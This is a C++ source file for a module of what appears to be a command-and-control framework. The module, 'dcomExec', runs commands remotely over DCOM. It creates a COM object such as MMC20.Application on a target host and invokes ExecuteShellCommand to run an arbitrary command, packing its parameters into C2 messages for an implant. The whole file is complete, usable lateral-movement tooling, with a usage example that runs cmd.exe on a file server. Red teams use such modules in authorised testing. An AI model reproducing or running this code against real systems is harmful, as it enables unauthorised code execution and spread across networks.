#include "DcomExec.hpp"

#include "Common.hpp"

#include <sstream>

#ifdef _WIN32
#include <windows.h>
#include <atlbase.h>
#include <comdef.h>
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
using ATL::CComPtr;
#endif

using namespace std;

constexpr std::string_view moduleNameDcom = "dcomExec";
constexpr unsigned long long moduleHashDcom = djb2(moduleNameDcom);

#ifdef _WIN32
extern "C" __declspec(dllexport) DcomExec* DcomExecConstructor()
{
    return new DcomExec();
}
#else
extern "C" __attribute__((visibility("default"))) DcomExec* DcomExecConstructor()
{
    return new DcomExec();
}
#endif

DcomExec::DcomExec()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleNameDcom), moduleHashDcom)
#else
    : ModuleCmd("", moduleHashDcom)
#endif
{
}

DcomExec::~DcomExec() = default;

std::string DcomExec::getInfo()
{
    std::ostringstream oss;
#ifdef BUILD_TEAMSERVER
    oss << "DCOM Execution Module:\n";
    oss << "Trigger remote COM objects to execute commands." << '\n';
    oss << "Options:" << '\n';
    oss << "  -h <host>           Remote hostname or IP." << '\n';
    oss << "  -p <ProgID>        COM ProgID (default MMC20.Application)." << '\n';
    oss << "  -c <command>       Command to execute." << '\n';
    oss << "  -a <arguments>     Arguments for the command." << '\n';
    oss << "  -w <working dir>   Working directory." << '\n';
    oss << "Example:" << '\n';
    oss << "  dcomExec -h fileserver -c cmd.exe -a \"/c whoami\"" << '\n';
#endif
    return oss.str();
}

std::string DcomExec::packParameters(const Parameters& params) const
{
    std::string packed;
    auto append = [&packed](const std::string& value)
    {
        packed.append(value);
        packed.push_back('\0');
    };

    append(params.hostname);
    append(params.progId);
    append(params.command);
    append(params.arguments);
    append(params.workingDir);
    return packed;
}

DcomExec::Parameters DcomExec::unpackParameters(const std::string& data) const
{
    Parameters params;
    std::vector<std::string> parts;
    size_t start = 0;
    while (start < data.size())
    {
        size_t end = data.find('\0', start);
        if (end == std::string::npos)
        {
            break;
        }
        parts.emplace_back(data.substr(start, end - start));
        start = end + 1;
    }

    if (parts.size() < 5)
    {
        return params;
    }

    params.hostname = parts[0];
    params.progId = parts[1];
    params.command = parts[2];
    params.arguments = parts[3];
    params.workingDir = parts[4];
    return params;
}

int DcomExec::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    std::vector<std::string> args = regroupStrings(splitedCmd);
    Parameters params;
    params.progId = "MMC20.Application";

    if (args.size() < 2)
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

    for (size_t i = 1; i < args.size(); ++i)
    {
        const std::string& current = args[i];
        if (current == "-h" && i + 1 < args.size())
        {
            params.hostname = args[++i];
        }
        else if (current == "-p" && i + 1 < args.size())
        {
            params.progId = args[++i];
        }
        else if (current == "-c" && i + 1 < args.size())
        {
            params.command = args[++i];
        }
        else if (current == "-a" && i + 1 < args.size())
        {
            params.arguments = args[++i];
        }
        else if (current == "-w" && i + 1 < args.size())
        {
            params.workingDir = args[++i];
        }
        else if (!current.empty() && current[0] != '-')
        {
            if (params.hostname.empty())
            {
                params.hostname = current;
            }
            else if (params.command.empty())
            {
                params.command = current;
            }
            else if (params.arguments.empty())
            {
                params.arguments = current;
            }
        }
    }

    if (params.hostname.empty() || params.command.empty())
    {
        c2Message.set_returnvalue("Missing hostname or command.\n" + getInfo());
        return -1;
    }

    c2Message.set_instruction(splitedCmd[0]);
    c2Message.set_cmd(packParameters(params));
#endif
    return 0;
}

int DcomExec::process(C2Message& c2Message, C2Message& c2RetMessage)
{
    Parameters params = unpackParameters(c2Message.cmd());
    std::string result;

#ifdef _WIN32
    result = executeRemote(params);
#else
    (void)params;
    result = "DCOM execution is only supported on Windows.\n";
#endif

    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_cmd(c2Message.cmd());
    c2RetMessage.set_returnvalue(result);
    return 0;
}

int DcomExec::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
{
    errorMsg = c2RetMessage.returnvalue();
    return 0;
}

#ifdef _WIN32
namespace
{
    std::wstring toWide(const std::string& value)
    {
        if (value.empty())
        {
            return std::wstring();
        }
        int sizeNeeded = MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), nullptr, 0);
        std::wstring wide(sizeNeeded, L'\0');
        MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), wide.data(), sizeNeeded);
        return wide;
    }

    std::string formatHResult(HRESULT hr)
    {
        _com_error err(hr);
        std::ostringstream oss;
        oss << "HRESULT 0x" << std::hex << std::uppercase << hr << ": " << err.ErrorMessage();
        return oss.str();
    }
}

std::string DcomExec::executeRemote(const Parameters& params) const
{
    std::ostringstream oss;

    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    bool needUninit = false;
    if (SUCCEEDED(hr))
    {
        needUninit = true;
    }
    else if (hr != RPC_E_CHANGED_MODE)
    {
        return "CoInitializeEx failed: " + formatHResult(hr) + "\n";
    }

    CComPtr<IUnknown> unknown;
    CLSID clsid;
    std::wstring progIdWide = toWide(params.progId);
    hr = CLSIDFromProgID(progIdWide.c_str(), &clsid);
    if (FAILED(hr))
    {
        if (needUninit)
        {
            CoUninitialize();
        }
        return "CLSIDFromProgID failed: " + formatHResult(hr) + "\n";
    }

    std::wstring hostnameWide = toWide(params.hostname);
    COSERVERINFO serverInfo = {};
    serverInfo.pwszName = hostnameWide.empty() ? nullptr : const_cast<LPWSTR>(hostnameWide.c_str());

    MULTI_QI mqi = {};
    mqi.pIID = &IID_IDispatch;
    mqi.pItf = nullptr;
    mqi.hr = 0;

    hr = CoCreateInstanceEx(clsid, nullptr, CLSCTX_REMOTE_SERVER | CLSCTX_LOCAL_SERVER,
                            serverInfo.pwszName ? &serverInfo : nullptr, 1, &mqi);
    if (FAILED(hr) || FAILED(mqi.hr))
    {
        if (needUninit)
        {
            CoUninitialize();
        }
        return "CoCreateInstanceEx failed: " + formatHResult(FAILED(hr) ? hr : mqi.hr) + "\n";
    }

    CComPtr<IDispatch> dispatch;
    dispatch.Attach(static_cast<IDispatch*>(mqi.pItf));

    DISPID dispid;
    OLECHAR* methodName = const_cast<OLECHAR*>(L"ExecuteShellCommand");
    hr = dispatch->GetIDsOfNames(IID_NULL, &methodName, 1, LOCALE_USER_DEFAULT, &dispid);
    if (FAILED(hr))
    {
        if (needUninit)
        {
            CoUninitialize();
        }
        return "GetIDsOfNames failed: " + formatHResult(hr) + "\n";
    }

    VARIANT args[4];
    VariantInit(&args[0]);
    VariantInit(&args[1]);
    VariantInit(&args[2]);
    VariantInit(&args[3]);

    std::wstring commandWide = toWide(params.command);
    std::wstring argsWide = toWide(params.arguments);
    std::wstring workDirWide = toWide(params.workingDir);

    args[3].vt = VT_BSTR; // Command
    args[3].bstrVal = SysAllocString(commandWide.c_str());

    args[2].vt = VT_BSTR; // Parameters
    args[2].bstrVal = SysAllocString(argsWide.c_str());

    args[1].vt = VT_BSTR; // Working directory
    args[1].bstrVal = SysAllocString(workDirWide.c_str());

    args[0].vt = VT_BSTR; // Operation
    args[0].bstrVal = SysAllocString(L"Open");

    DISPPARAMS dispParams;
    dispParams.rgvarg = args;
    dispParams.cArgs = 4;
    dispParams.cNamedArgs = 0;
    dispParams.rgdispidNamedArgs = nullptr;

    hr = dispatch->Invoke(dispid, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &dispParams, nullptr, nullptr, nullptr);

    for (VARIANT& variant : args)
    {
        VariantClear(&variant);
    }

    if (needUninit)
    {
        CoUninitialize();
    }

    if (FAILED(hr))
    {
        return "Invoke failed: " + formatHResult(hr) + "\n";
    }

    oss << "Command dispatched to " << params.hostname << " using " << params.progId << "\n";
    return oss.str();
}
#endif
